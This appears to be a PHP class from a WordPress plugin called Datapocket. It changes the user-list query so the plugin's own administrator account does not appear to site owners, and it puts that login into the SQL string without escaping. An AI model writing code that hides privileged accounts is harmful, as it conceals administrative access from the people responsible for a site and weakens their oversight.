<?php

/**
 * @package Datapocket
 * @since   1.1.14
 */

defined( 'ABSPATH' ) || exit;

class Datapocket_Users {

	/**
	 * Hook in methods.
     *
     * @since 1.1.14
     *
     * @return void
	 */
	public static function init() {
		add_action( 'pre_user_query', array( __CLASS__, 'hide_datapocket_admin' ) );
	}

	/**
	 * Hide the datapocket admin account from the user list.
	 *
	 * @since 1.1.14
	 *
	 * @return void
	 */
	public static function hide_datapocket_admin( $user_search ) {
		global $wpdb;

		$user_login = datapocket_get_datapocket_admin()->user_login;

		$user_search->query_where = str_replace( 'WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '$user_login'",$user_search->query_where );
	}
}

Datapocket_Users::init();